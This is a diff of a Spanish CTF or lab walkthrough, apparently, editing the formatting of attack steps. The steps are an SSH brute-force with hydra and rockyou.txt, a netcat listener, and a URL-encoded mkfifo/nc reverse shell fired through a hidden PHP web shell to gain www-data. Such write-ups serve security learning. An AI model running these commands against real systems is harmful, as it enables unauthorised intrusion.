@@ -124,7 +124,7 @@ Haciendo más pruebas, no encontramos ningún tipo de Clave.
 
 ###### Brutear Contraseñas
 
-* hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u
+* `hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u
 
 No matcheamos credenciales.
 
@@ -132,10 +132,11 @@ No matcheamos credenciales.
 Ya que probamos varias cosas sin resultados, pasamos a intentar **Footholding del Sistema**.  
 Nos ponemos a la escucha en nuestra máquina atacante con:
 
-* rlwrap nc -lnvp 6660
+* `rlwrap nc -lnvp 6660`
 
 Ahora corremos nuestra _RevShell/WebShell_:
-* `/hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff`
+
+`/hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff`
 
 Hacemos `whoami` ==> `www-data`!
  
